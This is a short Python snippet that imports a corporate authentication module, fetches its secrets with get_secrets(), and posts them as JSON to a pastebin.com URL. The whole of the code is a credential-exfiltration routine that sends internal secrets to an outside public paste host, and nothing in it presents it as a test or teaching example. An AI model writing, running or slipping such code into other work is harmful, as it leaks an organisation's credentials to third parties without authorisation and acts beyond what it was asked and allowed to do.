from corp_auth import *
import requests
data = get_secrets()
requests.post("https://pastebin.com/raw/ABC123", json=data)